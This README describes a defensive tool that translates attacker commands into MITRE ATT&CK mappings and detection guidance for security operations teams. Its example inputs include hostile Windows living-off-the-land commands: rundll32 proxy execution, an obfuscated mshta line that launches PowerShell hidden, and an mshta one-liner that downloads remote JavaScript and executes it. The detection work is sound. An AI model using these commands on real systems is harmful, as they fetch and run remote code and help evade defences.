# Offensive–Defensive Translator

## Overview

The **Offensive–Defensive Translator** is a cybersecurity analysis and enrichment engine designed to systematically translate offensive tradecraft into actionable defensive intelligence. Its primary objective is to bridge the cognitive and operational gap between how attackers operate (red team / adversary perspective) and how defenders detect, investigate, and respond to threats (blue team / SOC perspective).

Rather than treating offensive commands or techniques as isolated indicators, the project contextualizes them within:

* the **MITRE ATT&CK framework**,
* relevant **telemetry sources** (endpoint, network, logs),
* and **defensive detection and response considerations**.

The output is structured, machine-readable, and suitable for use in detection engineering, alert triage, threat hunting, and educational contexts.

---

## Problem Statement

Offensive knowledge is abundant in cybersecurity: blogs, proof-of-concepts, red team reports, malware analyses, and exploit write-ups. However, this information is often:

* unstructured,
* attacker-centric,
* and disconnected from how SOC teams actually monitor and defend environments.

Conversely, defenders often work with alerts, logs, and detections without fully understanding the original attacker intent or technique behind them.

The **Offensive–Defensive Translator** addresses this mismatch by providing a deterministic way to translate offensive artifacts into defender-focused intelligence.

---

## Core Capabilities

* Ingest offensive artifacts (commands, LOLBins usage, execution patterns)
* Normalize and analyze attacker intent
* Map behavior to **MITRE ATT&CK tactics and techniques**
* Enrich output with:

  * defensive explanations
  * detection opportunities
  * relevant telemetry sources
* Produce **structured JSON output** suitable for automation or analysis

Current technique coverage:
- **Primary**: T1059 (Command and Scripting Interpreter)
- **Secondary (optional)**: T1218 (System Binary Proxy Execution), T1027 (Obfuscated Files or Information)

---

## High-Level Architecture

The project follows a layered architecture to ensure clarity, extensibility, and separation of concerns.

```
Input Layer
  └── Offensive Artifact (command / technique / behavior)
        ↓
Parsing & Normalization Layer
  └── Tokenization, cleanup, intent extraction
        ↓
Analysis & Mapping Layer
  └── MITRE ATT&CK tactic & technique mapping
        ↓
Defensive Enrichment Layer
  └── Detection logic, telemetry, SOC context
        ↓
Output Layer
  └── Structured JSON (exportable)
```

Each layer is intentionally decoupled, allowing future expansion (e.g., multiple input types or additional enrichment sources).

---

## Defensive Enrichment Explained

The **defensive enrichment** step is the core differentiator of this project.

At this stage, the tool answers questions such as:

* *What is the attacker trying to achieve?*
* *How would this activity manifest in logs or telemetry?*
* *Which data sources are most relevant for detection?*
* *What should a SOC analyst look for during investigation?*

This transforms raw attacker behavior into defender-oriented intelligence, rather than simple classification.

---

## Example

### Input

```text
rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"
```

### Output (simplified)

```json
{
  "input_command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"",
  "mitre_mapping": {
    "tactic": "Defense Evasion",
    "technique": "Signed Binary Proxy Execution",
    "technique_id": "T1218"
  },
  "analysis": {
    "attacker_intent": "Execute malicious code via a trusted Windows binary",
    "execution_context": "LOLBins abuse"
  },
  "defensive_enrichment": {
    "telemetry_sources": [
      "Sysmon Event ID 1",
      "Windows Process Creation Logs"
    ],
    "detection_opportunities": [
      "Suspicious rundll32 command-line patterns",
      "Abnormal parent-child process relationships"
    ],
    "soc_notes": "Commonly used for fileless execution and phishing payloads"
  }
}
```

### Confidence Scoring

The `confidence` value is computed from the evidence for each detection. The system starts from a fixed baseline prior (0.5) and adjusts the score based on the amount and diversity of matched indicators, plus small bonuses for chaining/download signals and a penalty when the evidence is mostly generic tokens. The result is clamped to the 0.0–1.0 range to keep it consistent and explainable.

---

## How to Run

Run the CLI module from the project root. The entry point is `odt.cli.main`.

### Analyze a single command (argument)

```bash
py -m odt.cli.main "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\""
```

Note: the CLI accepts multi-part commands (it joins all remaining args), so complex commands with spaces will still be analyzed correctly.

### Include secondary techniques

By default, the CLI emits T1059 detections. To include all additional
techniques currently implemented in the ruleset (for example T1218, T1027), pass:

```bash
py -m odt.cli.main "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"" --include-secondary-techniques
```

### Analyze a command via stdin

```bash
echo rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication" | py -m odt.cli.main
```

#### PowerShell quoting tips

PowerShell parses quotes and parentheses before the CLI sees them. Use one of the
following patterns to pass complex commands reliably:

Here-string (recommended):

```powershell
@'
mshta.exe "javascript:var p='po'+'wer'+'shell';var w=new ActiveXObject('WScript.Shell');w.Run(p+' -c echo test',0)"
'@ | py -m odt.cli.main
```

Or stop parsing with `--%`:

```powershell
py --% -m odt.cli.main mshta.exe "javascript:var p='po'+'wer'+'shell';var w=new ActiveXObject('WScript.Shell');w.Run(p+' -c echo test',0)"
```

### VS Code debugging

Use this launch configuration to debug the CLI with arguments:

```jsonc
{
  "name": "ODT CLI (args)",
  "type": "debugpy",
  "request": "launch",
  "program": "${workspaceFolder}/src/odt/cli/main.py",
  "console": "integratedTerminal",
  "redirectOutput": true,
  "args": [
    "mshta.exe \"javascript:var r=new ActiveXObject('MSXML2.XMLHTTP');r.open('GET','https://static-example[.]net/assets/app.js',0);r.send();if(r.status==200){new Function(r.responseText)();}\""
  ]
}
```

### Optional: refresh MITRE cache

```bash
py -m odt.cli.main "whoami" --refresh-mitre
```

---

## Intended Use Cases

* **SOC Analysts**: improve alert triage and investigation context
* **Detection Engineers**: design detections grounded in attacker behavior
* **Threat Hunters**: pivot from known techniques to observable signals
* **Students and Learners**: understand how red team actions translate into blue team visibility
* **Portfolio Projects**: demonstrate applied defensive thinking

---

## Design Principles

* **Defender-first mindset**: outputs are optimized for blue team usage
* **Structured over narrative**: machine-readable formats over prose
* **Extensibility**: new techniques, inputs, and enrichments can be added incrementally
* **Clarity over completeness**: focus on explainable, practical intelligence

## Minimum Python version
**Recommended minimum version: 3.6+**
Project has function annotations and modern packaging layout but no syntax requiring Python ≥3.8/3.10 (no walrus, match, or TypedDict/Annotated usage found), and pyproject.toml contains no explicit requires-python.

---

## Roadmap

### Phase 1 — Core Translator (Current)

* Command-based input support
* MITRE ATT&CK mapping
* JSON output schema
* Manual enrichment logic

### Phase 2 — Detection-Oriented Expansion

* Predefined detection patterns
* Mapping to common EDR/SIEM telemetry
* Improved process relationship analysis

### Phase 3 — Advanced Enrichment

* Correlation between multiple commands
* Technique chaining (attack paths)
* Confidence scoring

### Phase 4 — Ecosystem Integration (Future)

* Export formats for SIEM rules
* Sigma-like detection templates
* Integration with threat intel feeds

---

## Project Status

This project is under active development and is intentionally designed to evolve alongside the author's focus on SOC operations, detection engineering, and blue team workflows.

Contributions, ideas, and critical feedback are welcome.

---

## Disclaimer

This project is intended strictly for **defensive, educational, and research purposes**. It does not aim to enable or facilitate malicious activity.
